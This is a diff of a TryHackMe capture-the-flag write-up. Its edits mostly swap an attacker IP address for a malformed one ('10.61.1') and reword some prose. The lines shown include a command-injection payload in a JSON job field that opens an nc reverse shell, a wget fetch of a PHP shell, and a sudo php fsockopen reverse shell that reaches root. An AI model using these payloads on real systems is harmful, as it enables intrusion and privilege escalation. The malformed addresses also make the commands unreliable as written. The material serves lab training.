@@ -43,9 +43,9 @@ Let’s start a netcat listener to give it something to connect to:
 └─$ nc -lvp 81
 listening on [any] 81 ...
 10.10.115.84: inverse host lookup failed: Unknown host
-connect to [10.6.74.177] from (UNKNOWN) [10.10.115.84] 43784
+connect to [10.61.1] from (UNKNOWN) [10.10.115.84] 43784
 GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjE6MTI6MDIuMDg5NDc3IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1
-Host: 10.6.74.177:81
+Host: 10.61.1:81
 User-Agent: python-requests/2.22.0
 Accept-Encoding: gzip, deflate
 Accept: */*
@@ -148,7 +148,7 @@ Receive:
 Some of the more popular shells don’t seem to work on this box but eventually we find one that does. We set a listener and send the below payload to get a shell as ada:  
 
 ```json
-{"job_id": 0, "cmd": "127.0.0.1 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.74.177 4444 >/tmp/f"}
+{"job_id": 0, "cmd": "127.0.0.1 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.61.1 4444 >/tmp/f"}
 ```
 
 
@@ -351,7 +351,7 @@ There are (at least) two paths we can take from here, lets examine both.
 
 A quick search identifies an RCE for our version of phpMyAdmin. 
 
-```console
+```bash
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$ searchsploit   phpmyadmin 4.8.1                                                                           
 ------------------------------------------------------------------------------ ---------------------------------
@@ -383,7 +383,6 @@ In most challenges we’re trying to elevate *out* of the www-data account, lets
 Enumerating `/var/www/phpmyadmin` we see we can write to the `tmp` folder:
 
 ```console
-cd phpmyadmin/
 ada@forgottenimplant:/var/www/phpmyadmin$ ls -la
 
 total 908
@@ -408,7 +407,7 @@ drwxr-xr-x 25 www-data www-data   4096 Jul 12  2022 vendor
 ada@forgottenimplant:/var/www/phpmyadmin$
 ```
 
-If we can access this through the web server we'll be able to run code as www-data. 
+If we can access files in this directory through the web server we'll be able to run code as www-data. 
 
 Lets create a file and try to call it through `curl` as a quick test to prove that the folder is accessible:
 
@@ -423,10 +422,10 @@ hello
 Looks good. Let’s start a new listener, upload a PHP shell and trigger it with `curl`:
 
 ```console
-ada@forgottenimplant:/var/www/phpmyadmin/tmp$ wget 10.6.74.177/shell.php
+ada@forgottenimplant:/var/www/phpmyadmin/tmp$ wget 10.61.1/shell.php
 
---2023-08-02 22:32:12--  http://10.6.74.177/shell.php
-Connecting to 10.6.74.177:80... connected.
+--2023-08-02 22:32:12--  http://10.61.1/shell.php
+Connecting to 10.61.1:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 5493 (5.4K) [application/octet-stream]
 Saving to: ‘shell.php’
@@ -456,7 +455,7 @@ User www-data may run the following commands on forgottenimplant:
 To leverage this, we’ll start one more listener on an empty port, then make a call back via PHP with `sudo` : 
 
 ```console
-www-data@forgottenimplant:/$ sudo php -r '$sock=fsockopen("10.6.74.177",4447);exec("/bin/sh -i <&3 >&3 2>&3");'
+www-data@forgottenimplant:/$ sudo php -r '$sock=fsockopen("10.61.1",4447);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 Finally we see that beautiful hashtag prompt!
@@ -466,9 +465,11 @@ Finally we see that beautiful hashtag prompt!
 └─$ nc -lvp 4447
 listening on [any] 4447 ...
 10.10.115.84: inverse host lookup failed: Unknown host
-connect to [10.6.74.177] from (UNKNOWN) [10.10.115.84] 60730
+connect to [10.61.1] from (UNKNOWN) [10.10.115.84] 60730
 /bin/sh: 0: can't access tty; job control turned off
 # whoami
 root
 #
 ```
+
+Much thanks to [Ingo](https://tryhackme.com/p/Ingo) for the imaginative challenge!
